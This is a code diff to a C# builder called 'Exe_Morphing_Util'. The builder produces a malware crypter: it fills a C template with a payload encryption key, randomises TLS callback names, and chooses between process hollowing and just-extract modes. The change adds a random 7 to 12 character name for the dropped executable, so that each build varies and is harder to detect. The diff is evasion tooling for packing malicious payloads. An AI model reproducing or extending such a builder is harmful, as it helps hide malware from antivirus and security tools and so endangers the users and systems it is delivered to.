@@ -669,9 +669,11 @@ namespace Exe_Morphing_Util
             // with long jmp to our found code cave, have it jump back when done to our EP
             if(cbTLS.Checked)
             {
+                int justextract = 0;
                  // see if we want to use process hollowing or just extract
                 if (rbJustExtract.Checked)
                 {
+                    justextract = 1;
                     File.Copy("barebones\\dont_touch_me_TLS_callbacks_just_extract.joe", "builder\\joe_crypter.c", true);
                 }
                 else if(rbTransactional.Checked)
@@ -687,6 +689,12 @@ namespace Exe_Morphing_Util
                 string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
                 replacecrypto = replacecrypto.Replace("cryptokey",payloadcryptkey.ToString());
                 replacecrypto = replacecrypto.Replace("changemealreadyincode", RandomStringJustChars(12)); // TLS CALLBACK func NAME
+                if (justextract == 1)
+                {   // random exe name between 7 and 12 characters
+                    Random rnd = new Random();
+                    replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7,12)));  
+                }
+
                 File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
 
                 FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
@@ -908,6 +916,13 @@ namespace Exe_Morphing_Util
 
             string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
             replacecrypto = replacecrypto.Replace("cryptokey", payloadcryptkey.ToString());
+            if (which == 1)
+            {   // random exe name between 7 and 12 characters
+                Random rnd = new Random();
+                replacecrypto = replacecrypto.Replace("imanexechangemealready", RandomString(rnd.Next(7, 12)));
+            }
+
+
             File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
 
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
